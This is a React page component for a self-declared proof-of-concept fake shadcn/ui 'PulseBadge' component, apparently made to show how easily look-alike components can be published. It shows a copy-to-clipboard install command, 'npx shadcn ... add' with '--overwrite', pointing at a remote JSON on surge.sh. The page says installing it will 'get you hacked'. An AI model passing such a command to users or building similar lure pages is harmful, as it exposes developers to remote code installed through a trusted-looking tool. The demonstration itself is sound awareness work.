"use client";

import { PulseBadge } from "@/components/pulse-badge";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { Copy, Check } from "lucide-react";
import { useState } from "react";

export default function App() {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(`npx shadcn@latest add https://shadcn-poc.surge.sh/fake-component.json --overwrite`);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen bg-background">
      <div className="container mx-auto px-4 py-8 max-w-4xl">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center gap-2 mb-4">
            <Badge variant="secondary">Component</Badge>
            <Badge variant="outline">Fake 💀</Badge>
          </div>
          <h1 className="text-4xl font-bold tracking-tight mb-2">
            Fake Shadcn Component 😈
          </h1>
          <p className="text-xl text-muted-foreground mb-6">
            A fake shadcn/ui component created for demonstration purposes. If
            you install it, you will get hacked 💀. Be careful!
          </p>

          {/* Installation */}
          <Card className="mb-8">
            <CardHeader>
              <CardTitle className="text-lg">Installation</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="flex items-center justify-between bg-muted p-3 rounded-md">
                <code className="text-sm">
                  npx shadcn@latest add
                  https://shadcn-poc.surge.sh/fake-component.json --overwrite
                </code>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={handleCopy}
                  className="h-8 w-8 p-0"
                >
                  {copied ? (
                    <Check className="h-4 w-4 text-green-500" />
                  ) : (
                    <Copy className="h-4 w-4" />
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Examples */}
        <div className="space-y-8">
          {/* Basic Usage */}
          <Card>
            <CardHeader>
              <CardTitle>Basic Usage</CardTitle>
              <CardDescription>
                The default pulse badge with various states
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="flex flex-wrap gap-4 mb-6">
                <PulseBadge>Live</PulseBadge>
                <PulseBadge variant="success">Online</PulseBadge>
                <PulseBadge variant="warning">Pending</PulseBadge>
                <PulseBadge variant="destructive">Error</PulseBadge>
              </div>
              <div className="bg-muted p-4 rounded-md">
                <code className="text-sm">
                  {`<PulseBadge>Live</PulseBadge>
<PulseBadge variant="success">Online</PulseBadge>
<PulseBadge variant="warning">Pending</PulseBadge>
<PulseBadge variant="destructive">Error</PulseBadge>`}
                </code>
              </div>
            </CardContent>
          </Card>
        </div>

        <Separator className="my-8" />

        <div className="text-center text-sm text-muted-foreground">
          <p>
            This is a fake shadcn/ui component created for demonstration
            purposes.
          </p>
          <p>
            When you install it, you will get pwned by a fake hacker. This is
            not a real component, just a joke to show how easy it is to create
            fake components that look real.
          </p>
          <p className="mt-4">
            Created by{" "}
            <a
              href="https://www.linkedin.com/in/ademkouki/"
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-500 hover:underline"
            >
              Adem Kouki
            </a>
          </p>
        </div>
      </div>
    </div>
  );
}
